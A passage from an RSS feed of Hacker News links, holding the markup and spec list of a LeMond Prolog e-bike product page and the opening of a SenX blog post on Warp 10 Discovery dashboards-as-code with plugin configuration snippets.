src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAyADIDASIAAhEBAxEB/8QAHAABAAICAwEAAAAAAAAAAAAAAAEGAgMEBQcI/8QAKhAAAQMDAgQGAwEAAAAAAAAAAQACAwQFERIxBhMhUQcUFSJxgTJBYaH/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/EABYRAQEBAAAAAAAAAAAAAAAAAAARIf/aAAwDAQACEQMRAD8A+h0RQc4OnGcdMoJ32Qgg+4EfIXRU0F6rmVNHf4LX5KZnL1UVRM15B33ALfkHKrvB9tvFh4PoKex22F1VNI59R6nWyjl+5wzjDnbAdBjugv6Li23zvk2epilFX11ilLjH/Mauuy5SAiIgIiINdRKIYJJHbNGeiwppeYHNIw9mM/YzldNx1NcmcNV0VjgqJblNE5kDooi8Md3JGx7Z6ZVb8IuJrpfLeILxA91RFBG99SI9LXE6hjts0bfaLkeiIiIgiIgKCcKVBCDAyhrm5H7CqHhWY2cFW9zGgPeH6yD+WJHgf4rgWNO6whpooGBkMbWMGzWjACDYHZUoAApQEREBERAREQEREBERB//Z"></picture></div><div display="block,,none"><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Rear_Centerfold_Mobile.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Rear_Centerfold_Mobile.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCABTADIDASIAAhEBAxEB/8QAHAABAAEFAQEAAAAAAAAAAAAAAAYBAgMEBwUI/8QAMRAAAQQCAAQDBwIHAAAAAAAAAQACAwQFEQYSITEHEzIiQVFhcYGRCKEWUmSCsbLB/8QAFgEBAQEAAAAAAAAAAAAAAAAAAAED/8QAGxEBAAICAwAAAAAAAAAAAAAAAAEhAhFBoeH/2gAMAwEAAhEDEQA/APodFjnmirxOknljijb3fI4NA+5WCPI0ZXNbFeqPc7o0NnYSfoNoNtO3dRbxCwOdz2KjrcPZt+Ima4ukIa4eaNdG8zSC3r16KC+BeJ4lnp185kuJLVii980ZpSSOm8zlJaCXO9OiNjSDsaLBPcrV38lizXhf/LJK1p/BKpWu1bTnCrarzlvqEUrX6+uig2EREGlmcVRzWOloZarFbpy6L4ZRtrtHY/BAKhzfCPgxlwWYsSYpmyCRhisSMDCOwbo9AFPkQedDiqlWmYYmTuYAfXYke4/3OcSol4T4K5Q4Gq1MlHbo2WyS80XmNO2l5IPTeuincp1G4n4JEQ5jSOxCDmx8GuHbWWs381YyeWklOmNtWCfLZ7m7HU69x2FLeGeEMDwwZHYLGV6csrBHLIwHmkAOxzH6r30QEREBERB5+XnLWwV2eqw4tJB0WtDSSR+w+6thsOht1oXDbLDDo79LgCdAfMb/AAo74lcT0uFqde3cY58r3eWzlHUNLm8x32Gh1+etL0MBnMVxFFVsYqw21BFpvOGFunj69ff/AJU1LSJxquO78SRERVmIiICw25xVqzTuZLI2JheWRML3u0OzWjqT8lmRB8/eNUUnFkMU2Mp8SiZgJ8i3QdFAxjQC4gkdNgbP0HZRXh3LyYfhzGHz5q0dqzIwTsdy8vss31+WwvqPIjmx1xp6gwSAj4+yVx7wXxAyHC/Ddt9aGxBVs2mSiQAhodG3R0e/tNA/dB17GWprlUTWKclNzj0jkka8ke47addVtoiAiIgtJVpcQqkKxzSUGrkZSKNkb7xP/wBSuefp+kLPDyJv9TL/AMXRLNfzYnsO9OaWn7jSjvAXC38K4JuNbO6wGyvk8xzQCeY9tD7IJW2QlXhyxNYQsgCC7aKmkQXIURBTSaREAKqIgqiIg//Z"></picture></div><div id="features" display="flex"><div display="flex"><div width="1,,0.3333333333333333" order="1,,0"><p><span font-size="34" font-family="display" font-weight="600" display="none,,inline" color="text.black">Upgrades</span></p><div height="100%" display="flex"><p><span color="text.black" font-family="display" font-weight="600" font-size="18">Electronic shifting</span></p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">The revolutionary Di2 shifting system solves the challenges drivetrains present to the power-delivery equation in cycling. Di2 gives you instant, accurate, lighting-fast shifts the first and every time, at the push of a button. Even in the most extreme conditions, shifting is precise and controlled. You can change gear even under heavy load while climbing or accelerating. With Di2, you are in complete control.</p></div></div><div width="1,,0.5" offset="0,,0.08333333333333333" order="0,,1"><div><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Di2_Upgrades.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Di2_Upgrades.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAyADIDASIAAhEBAxEB/8QAHAAAAQQDAQAAAAAAAAAAAAAAAAQGBwgBAgUD/8QANBAAAQMDAwEFBQcFAAAAAAAAAQIDBAAFEQYSITEHEyJBYRRRcYGRFRYyUnKisSMzQpLR/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABURAQEAAAAAAAAAAAAAAAAAAAAR/9oADAMBAAIRAxEAPwCxyYyiMlQHpQYxH+QpRupNLQZDK2kuFvcMFSetAmbcQ5u7taVhKiklJyMjrW9M+56psWhzEtd8uTaJb251KUJKsJKuFK92a7OmtQQtSsOyLQJTsRCtqZCo60Nu+8tqI8QB4yKDr0VhZCPxkJ/UcVlPiHg8X6eaAoowfcaKDha61U1p2EkIw5Ne4bbz0H5j6U3Gu0GPadPru18UtTSFJTsZTlalKOAEimNfpT96ur02UTuWfCnySnyApvavhyxFtDb7JVCW57ThWSlSUnAzjnBOfp60Ee3y6yNZavuFyvD7UAy3eFSHCEtN5wlIIB6JGKuLYL/p1FrixrZPiIisNJabQHAkJSAABVUXrdEvV47pppqEtT3jRGH9JDWMkpyo88cDzJ602r3Z1R56mYySIzilBshzelaUnBOcDI4zyBSC9vtMSSA2XWHgoZ2EpVke/HzpFJ07ZZRy7bYu78zae7V9U4qoPZs5KtWoRdErcbiQWdrqiVYJWQAkf89KnSB2sWVxxDCpD3fEfhDKj/AoJA+6Nq8jcAPcLi/gfvorgDXEMgHe5/oaKBhQ4/tEppkcFxYTn4nFPW4dmFnuUMM3O4X2Y82kpZkOT1BTHq2lICE9OmKZcV9LS2nkkFIIUkg5B+FSnYLumVFaS6rx7RyfhQRrM7FXzF2R9UPSVgni4wm3kkeQyOabN27JdYEpZisWiSlQ2d61KWjCSefC50BxzirF1kq2IJoGdaNPW7SmivsXCX23ElUtThyHnFJAWrB6DjgeQFQbonTzfst1ubxc7pob21JPJR3oQAD5ZB61Kvafc3VxEW+IvEme6mK2c9NxwT8hmkjsC32D7WtySFMCXbYqknjakAOLP7SaCMZtuucWbIjqk8tOKbOevBxRXfuVvlXG4ypqUupTJdW8E7hxuJOOnrRQedp8JmNJ4bbmupQgdEjA4A8hyfrT/siiFDBPWiigkS3kmMnJJ+NbTf7J+FFFBDeqPFrmyhXIBUoA+R3t81trXnUl8B5BmIyPmkfxxRRQez5IfcAJACj/ADRRRQf/2Q=="></picture></div></div></div><div display="flex"><div width="1,,0.3333333333333333" offset="0,,0.08333333333333333" order="1,,0"><div height="100%" display="flex"><p><span color="text.black" font-family="display" font-weight="600" font-size="18">LeMond LC30 Carbon Wheelset</span></p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">The LeMond LC30 rim is our new carbon fiber rim developed in partnership with Munich Composites, a German aerospace components manufacturer.</p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">The LC30 is a low weight, aerodynamic rim, made from aerospace grade carbon fiber. With an inner rim width of 21mm and outer rim width of 28mm, the LC30 rims are built for today’s modern wider tubeless tires and paired with a front hub made by TUNE, a premiere boutique component manufacture located near Germany’s Black Forest. </p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">The LC30’s are covered by our lifetime warranty and accident replacement plan.</p></div></div><div width="1,,0.5" offset="0,,0.08333333333333333" order="0,,1"><div><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_CarbonWheel_Upgrades.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_CarbonWheel_Upgrades.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAyADIDASIAAhEBAxEB/8QAHAAAAgIDAQEAAAAAAAAAAAAAAAcBAgMEBgUI/8QAOBAAAgECBAMFBQcDBQAAAAAAAQIDBBEABQYhBxIxE0FRYXEVIjKBkRQWI0JScqEXM0RUYoOSsf/EABcBAAMBAAAAAAAAAAAAAAAAAAACAwH/xAAnEQACAQIDCAMBAAAAAAAAAAAAAQIR8AMSMRMhMlFhcaGxQULR4f/aAAwDAQACEQMRAD8A+h8cjq7XOX6faaBAKuuiUNLGJAkcAPQyyHZb9y7sfDE8RdSNkOUrHSzLDXVQfklYXFPGovJMR38osAO9mUYXfDzQ6amWDPdSU7tlpYzZblU5JEyk7zzH87t13+e1hiU5SbyQ19XfV4xSWaRrf1L1PnzyHT1NmFZGvflOXAxD/llvf1sMX++et8ojM2c5dqWnjQ+/JPlsNTEP3dnysPrhyqI4Y0ihULCI2SNVFgqjcC3dYgi3pjNJIVmYJ8RkuN7XIUW/k/xjVhtayYOfRC/0hxWy/NY19pGnijJ5ftlOxMIPhIre9F6m488MsEEAggg7gjC015w8ps4BzbTwjoNRKD2ciKFSu8VmXoQegbqL73G2NDg3qt5CuSVqvCpZ44IZfipZk/uU5v3bFl8LMO4YxSlF5Z766P8Ab/utKSrEbeDBgxUmI7ierZ9rf2S0nLFPVUuWEk7LGF7eX6lk/wCow3Pwoolip/s4iUALHHIAoA6WB+G3kflhUasf2XxTiqpjyxx5rT1Ba17JNThAbfuhYYbssk1+UdqW7gwVb/KxP1xLC+3e/A8/jseVmGZQxxM0kix1CXkCyME7Sw3sel7X6dfIjGCgz7LcyZ6qkrIKmmclIeycP2tgCxAG9r7HxtbxxXUuXtmmSVlLVyt9mqImi7GGwMtxYe8RcC5G4t5eOPI0Bo6LR1HUZZltbUyMJecvPyt2wKi21hykWIsDvbxxUQ7COdnJLWQt1LOqk+W1yB5D64TGvIvu/wASJ66i5EWqpos1AjBAE0D2c7/qQG/qcOmCSWyhnkW+w5WUg+lx/HXCj4vuazVcdPG0kksGVvCQygEPM4RV28S64ljcF8x8PiHcAXAZPgbcemDExN2MaRdeQBb+m2DFRBa8Y8hFVQrmy8wiiiNPWsq3McPMHSYDv7OQBj/tZ8bPDvVKZvRey8z5I86pFVJoA1zU7e7IrfmUixuOo36bY78gEEEAg7EEXvhSax4azRSrV6aDtFES8VPFMIaikN7kU8h2KX37J9h+UjEpJxeaO/n+jpqSoxkzIXkBYhivMxI6EqLbeQJAHzwSxAVLkLzWblt4jlU29djbzAwkhr/VWnr0uZSZbUEJ2QXNYpKCcDzJ9xj5hjisnFXUlcxioV05TzuykPHO9bJcdOVIwb9fDBt4Wn6N2chvaq1Dl+msokr80mTlI/DQ/wCWe5QP1efd16bYXPD7LazUmr5c1zNCBBOKuqB3CygfgU481B52Hd7gO+NPT2g9RaizNMzz6orIm/1tcoWVB1tT0+4j/e/TqFvh0ZNldHkuWw0GWwiGlhFlW5JJO5Zid2Ynck7k4xVxHVqiXm76m6CotTdwYnBixMMUfBgwAYhDFM/JLGjp+llBGJelp6cAwQRRE9eRAv8A5gwYAICgHYAYypgwYAL4MGDAB//Z"></picture></div></div></div></div><div display="flex"><div display="flex"><div width="1,,0.4166666666666667"><div display="flex"><p><span font-size="15" color="black" font-weight="300" font-family="text">System</span></p><p><span font-size="15" font-weight="300" color="black" font-family="text">Mahle X35+ mobile app</span></p></div></div></div></div><div id="components" display="flex"><div display="flex"><div width="1,,0.6666666666666666"><div display="flex"><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Motor</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Mahle M1; Rear hub; 250w – Max. Torque: 40N.m</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Battery</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Embedded/down tube; 36V, 250W Panasonic</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Interface</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Single button toggle; iWoc 1 by Mahle</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Headlight</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Dual mode LED; 500 lumens; LeMond Design</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Tail Lights</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Dual mode LED; 70 lumens each; 180º rear visibility; LeMond Design</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Mobile app</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Mahle ebikemotion rider app (ios/android)</span></p></div></div></div></div></div><div display="flex"><div width="1,,0.6666666666666666"><div display="flex"><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Frame</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Carbon fiber monocoque</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Fork</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Carbon fiber monocoque</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Fenders</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Carbon fiber (front/rear)</span></p></div></div></div></div></div><div display="flex"><div width="1,,0.6666666666666666"><div display="flex"><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Cassette</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano CS-M7000 11-40T</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Rear Derailleur</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano GRX RD-RX812</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Crankset</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano GRX FC-RX810-1 170 40T</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Chain</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano	11-Speed - Super Narrow - HYPERGLIDE - SIL-TEC -E-BIKE Chain</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Bottom Bracket</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Token	Ninja PF30</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Rear Derailleur	(Upgrade)</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano GRX RD-RX817 Di2	SHADOW RD+ - 42T max low sprocket - 11-speed</span></p></div></div></div></div></div><div display="flex"><div width="1,,0.6666666666666666"><div display="flex"><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Brake Levers</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano	BL-RS600 Hydraulic Disc Brake Lever - I-SPEC II - 3-Finger</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Brake Rotors</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano DEORE XT M8000 Series, Ice Technology Rotor; 160mm 6-bolt</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Shifter</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">SHIMANO RS-700, RAPIDFIRE PLUS Flat Bar Road - 1x11-speed</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Shifter (Upgrade)</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano	XT SW-M8050 Di2	SHIMANO DEORE XT - DI2 Shift Switch - FIREBOLT Shifter - E-TUBE</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Di2 Display (Upgrade)</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Shimano	SC-MT800	SHIMANO DEORE XT - DI2 System Information Display - E-TUBE - D-Fly Wireless System</span></p></div></div></div></div></div><div display="flex"><div width="1,,0.6666666666666666"><div display="flex"><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Tires</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">LeMond / Panaracer Gravelking Slick+ 700 x 38mm</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Rim (Upgrade)</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">LC30 w Tune KillHill | Height 30mm | Inner width 21 mm | Outer width 33 mm | 390 grams</span></p></div></div></div></div></div><div display="flex"><div width="1,,0.6666666666666666"><div display="flex"><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Seatpost</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Carbon fiber, 30.9mm</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Rear Rack (Upgrade)</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Carbon fiber</span></p></div></div><div width="1,,0.3333333333333333"><div color="#8C8C8C" display="flex"><p><span font-family="display" font-size="15" font-weight="400" letter-spacing="0.02em" color="#E5E5E5">Front Basket (Upgrade)</span></p><p><span font-family="display" color="#8C8C8C" font-weight="400" font-size="15" letter-spacing="0.02em">Carbon fiber</span></p></div></div></div></div></div></div><div display="none,,block" height="95,,65"><div height="100%" display="flex"><div display="flex"><div width="0.9166666666666666" offset="0.08333333333333333"><div height="100%" display="flex"><p><span font-size="34" font-weight="600" font-family="display" color="text.black">Prolog</span></p><div display="flex"><p><span font-weight="300" color="text.black" font-family="text">Starting at<!-- --> <!-- -->$4500<!-- --> <!-- -->| Shipping <!-- -->January 2021</span></p><p><span font-size="15" font-weight="500" color="text.black" font-family="text">Buy now</span></p></div></div></div></div></div></div><div display="block,,none" height="95"><div height="100%" display="flex"><p><span font-family="display" font-weight="600" font-size="22" color="text.black">Prolog</span><span font-size="0" font-weight="400" color="text.black" font-family="text">Shipping <!-- -->January 2021</span></p><p><span font-size="15" font-weight="500" color="text.black" font-family="text">$4500</span></p></div></div></main></div></div></div>]]>
            </description>
            <link>http://Lemond.com/prolog</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229754</guid>
            <pubDate>Fri, 27 Nov 2020 16:06:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Discovery, a Truly Dynamic Dashboards as Code]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25229629">thread link</a>) | @MorganeR
<br/>
November 27, 2020 | https://blog.senx.io/truly-dynamic-dashboards-as-code/ | <a href="https://web.archive.org/web/*/https://blog.senx.io/truly-dynamic-dashboards-as-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>With its unique dashboards as code approach, Warp 10 Discovery is the tool of choice to create highly dynamic dashboards from your time series data</p><article>
      
<p>When you hear people talk about time series, chances are pretty high they will also coin the term dashboard in the same conversation. The reason for that is simple. <strong>Among the first things people do when working with time series databases is the creation of dashboards to visualize the stored data.</strong></p>



<p>Despite some efforts to create alternative tools or services, <a href="https://en.wikipedia.org/wiki/Grafana" target="_blank" rel="noreferrer noopener">Grafana</a> remains the number one choice for many to create dashboards. Sure Grafana is great. It can connect to many data sources, has some nice themes and widgets. And it has a visual interface for building dashboards that appeals to newcomers. </p>



<p>But once you get into some serious monitoring and want to build complex dashboards, the visual interface you used to love quickly becomes the one you start hating. Indeed it is long and tedious to create large dashboards this way and impossible to create what we call dynamic dashboards.</p>



<h2>What are dynamic dashboards?</h2>



<p>For some, dynamic dashboards are the ones that periodically update with recent data. For others, they are dashboards which can display information about a variable number of systems based on parameters that are chosen dynamically by the viewer. Though there is indeed a dynamic nature to those dashboards it is really light.</p>



<p><strong>What we call dynamic dashboards are dashboards whose content can completely change depending on the actual context.</strong> Instead of always showing the same graphs, dynamic dashboards will display contextual information that will immediately catch your attention. </p>



<p>Imagine for example a dashboard showing the current trend for a system. It will display the last hour of data and will rely on you to spot the anomalies. A dynamic dashboard on the other hand would also display the last hour as the standard dashboard. But upon detecting a specific situation it would additionally display graphs for other systems, the list of alerts which were triggered, links to knowledge base articles related to the nature of the current incident, and a status of possibly impacted systems, all on the same screen.</p>



<p><strong>Building such dashboards using a tool like Grafana is impossible</strong>. You would probably need to build a full-fledged application that may redirect to different Grafana dashboard URLs depending on the context. Not the most efficient way to go...</p>



<h2>Introducing Discovery</h2>



<p>At <a href="https://senx.io/" target="_blank" rel="noreferrer noopener">SenX</a> we strongly believed that there was a better way and we proved it with the creation of <em>Discovery</em>.</p>



<p>Discovery is SenX's dashboarding solution for the <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a> Time Series Platform. <strong>What makes Discovery unique is its <em>Dashboards as Code</em> approach.</strong> </p>



<p>With Discovery, creating dashboards is simply a matter of using a specific macro in your <a href="https://www.warp10.io/content/03_Documentation/04_WarpScript" target="_blank" rel="noreferrer noopener">WarpScript</a> or <a href="https://blog.senx.io/introducing-flows/" target="_blank" rel="noreferrer noopener">FLoWS</a> code.</p>



<p>The macro expects a list of <em>tile</em> descriptions and an optional set of global parameters. It will produce an HTML rendering of your dashboard, complete with auto-refresh capabilities.</p>



<p>Coupled with the <a href="https://blog.senx.io/http-plugin/" target="_blank" rel="noreferrer noopener">HTTP Plugin</a>, you can serve those dashboards directly from your Warp 10 instance, avoiding the need to deploy and operate additional tools such as Grafana and therefore keeping your cloud bill under more control.</p>



<p>And since your dashboards are now pieces of code, you can use git to manage them and track changes. No more bad surprises after a colleague changed the style or the layout of important dashboards because s/he thought the change was only local... I'm sure you have experienced this before!</p>



<h2>Discovery in practice</h2>



<p>Putting Discovery to work is very simple. You should have your first dashboard available minutes after you start.</p>



<h3>Configuring the HTTP Plugin</h3>



<p>The first step to use Discovery is to configure the HTTP Plugin in your Warp 10 instance. To do this, add the following lines to a configuration file and restarting the instance:</p>



<pre><code># Load the HTTP Plugin
warp10.plugin.http = io.warp10.plugins.http.HTTPWarp10Plugin
# Define the directory where endpoint spec files will reside
http.dir = /path/to/http.dir
# Define the host and port the plugin should bind to
http.host = 127.0.0.1
http.port = 12345
# Expose the Directory and Store so FETCH requests can be performed via the plugin
egress.clients.expose = true</code></pre>



<p>The next step is to create a <code>discovery.mc2</code> endpoint specification file for the HTTP Plugin. Create this file in the <code>http.dir</code> directory defined above with the following content:</p>



<pre><code>{
  'path' '/discovery/'
 &nbsp;'prefix' true
 &nbsp;'parsePayload' true
 &nbsp;'macro' &lt;%
 &nbsp;&nbsp; 'prefix/dashboard/' @senx/discovery/dispatcher
 &nbsp;%&gt;
} </code></pre>



<p>This specification defines the handling of requests to the HTTP Plugin for URLs starting with <code>/discovery/</code>. Requests for <code>/discovery/foo/bar</code> will invoke the macro <code>@prefix/dashboard/foo/bar</code>. The macro will be called with the <code>request</code> object from the HTTP Plugin and is expected to return the HTML content of your dashboard, more on this later.</p>



<p>The dispatching of requests is ensured by the macro <code>@senx/discovery/dispatcher</code>. This macro is available on SenX' WarpFleet macro repository which is configured by default in the Warp 10 distribution via the line:</p>



<pre><code>warpfleet.macros.repos = https://warpfleet.senx.io/macros</code></pre>



<p>If you would rather host the macro locally, you can <a href="https://warpfleet.senx.io/macros/senx/discovery/dispatcher.mc2" target="_blank" rel="noreferrer noopener">download </a>it and save it under <code>senx/discovery/dispatcher.mc2</code> in your instance local macro repository.</p>



<h3>Creating dashboards</h3>



<p>The second and final step is to create macros for each of your dashboards. If you have configured the plugin as above, those macros should be in the subdirectory <code>prefix/dashboard</code> of the macro repository of your Warp 10 instance.</p>



<p>Dashboard macros are pretty simple. They define tiles which compose your dashboard and call a macro that renders those tiles as HTML. This macro and a set of side macros are also available on SenX' WarpFleet macro repository. In case you want to deploy them locally, download the following files:</p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/render.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/render.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/tile.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/tile.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/layout.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/layout.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/html.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/html.mc2</a></code></p>



<p>and deploy them in subdirectory <code>senx/discovery</code> of your Warp 10 instance macro repository (configured via <code>warpscript.repository.directory</code>).</p>



<p>The <code>@senx/discovery/render</code> macro expects a map as input with the following entries:</p>



<pre><code> {
 &nbsp; &nbsp; 'title' 'My Dashboard'
 &nbsp; &nbsp; 'description' 'My tremendous dashboard'
 &nbsp; &nbsp; 'tiles' [ ... ]
 &nbsp; &nbsp; // Custom CSS styles
 &nbsp; &nbsp; 'styles' '&lt;style&gt; body { background: pink; }&lt;/style&gt;'
 &nbsp; &nbsp; // Custom HTML Header
 &nbsp; &nbsp; 'header' '&lt;div&gt;&lt;img src="myLogo.png"&gt;&lt;/div&gt;'
 &nbsp; &nbsp; // Custom HTML Footer
 &nbsp; &nbsp; 'footer' '&lt;p&gt;Copyright SenX.io&lt;/p&gt;'
 &nbsp; &nbsp; 'cols' &nbsp; 12 &nbsp; &nbsp; // Number of columns of the grid, default is 12
